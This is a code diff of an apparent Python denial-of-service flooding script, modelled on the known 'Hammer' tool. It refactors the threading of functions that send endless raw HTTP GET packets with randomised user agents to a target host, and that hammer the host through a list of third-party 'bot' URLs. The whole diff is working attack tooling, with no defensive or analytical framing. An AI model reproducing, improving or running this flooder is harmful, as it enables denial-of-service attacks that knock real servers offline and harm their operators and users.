@@ -33,7 +33,7 @@ def bot_hammering(url):
 		time.sleep(.1)
 
 
-def down_it(item):
+def down_it():
 	try:
 		while True:
 			packet = str("GET / HTTP/1.1\nHost: "+host+"\nUser-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
@@ -53,17 +53,13 @@ def down_it(item):
 
 
 def dos():
-	while True:
-		item = q.get()
-		down_it(item)
-		q.task_done()
+	for _ in range(int(thr)):
+		down_it()
 
 
 def dos2():
-	while True:
-		item=w.get()
+	for _ in range(int(thr)):
 		bot_hammering(random.choice(bots)+"http://"+host)
-		w.task_done()
 
 
 def usage():
@@ -134,22 +130,13 @@ if __name__ == '__main__':
 		print("\033[91mcheck server ip and port\033[0m")
 		usage()
 	while True:
-		for i in range(int(thr)):
-			t = threading.Thread(target=dos)
-			t.daemon = True  # if thread is exist, it dies
-			t.start()
-			t2 = threading.Thread(target=dos2)
-			t2.daemon = True  # if thread is exist, it dies
-			t2.start()
-		start = time.time()
-		#tasking
-		item = 0
-		while True:
-			if (item>1800): # for no memory crash
-				item=0
-				time.sleep(.1)
-			item = item + 1
-			q.put(item)
-			w.put(item)
-		q.join()
-		w.join()
+		thread_one = threading.Thread(target=dos, daemon=True)
+		thread_two = threading.Thread(target=dos2, daemon=True)
+
+		thread_one.start()
+		thread_two.start()
+  
+		thread_one.join()
+		thread_two.join()
+  
+
